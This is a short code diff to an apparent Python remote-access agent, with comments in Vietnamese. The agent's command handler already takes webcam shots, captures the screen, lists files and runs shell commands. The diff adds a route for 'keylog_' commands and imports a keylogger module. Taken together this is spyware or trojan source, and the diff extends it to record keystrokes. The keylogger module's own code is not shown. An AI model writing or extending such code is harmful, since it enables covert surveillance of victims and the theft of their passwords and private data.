@@ -59,6 +59,8 @@ def execute(cmd, timeout=60):
         return capture_webcam()
     if c in ["screen", "screenshot", "man hinh"]:
         return capture_screenshot()
+    if c.startswith("keylog_"):
+        return keylog_handle(cmd)
     if c.startswith("ls "):
         return list_files(c[3:].strip())
     try:
@@ -104,6 +106,8 @@ for name in sorted(items, key=lambda x: (not os.path.isdir(os.path.join(p,x)), x
         return {"output": out.strip() or "(no output)", "exit_code": r.returncode}
     except Exception as e:
         return {"output": f"[ERROR] {e}", "exit_code": -1}
+
+from modules.keylogger import handle as keylog_handle
 
 def capture_webcam():
     """Chup webcam, tra ve base64 trong output"""
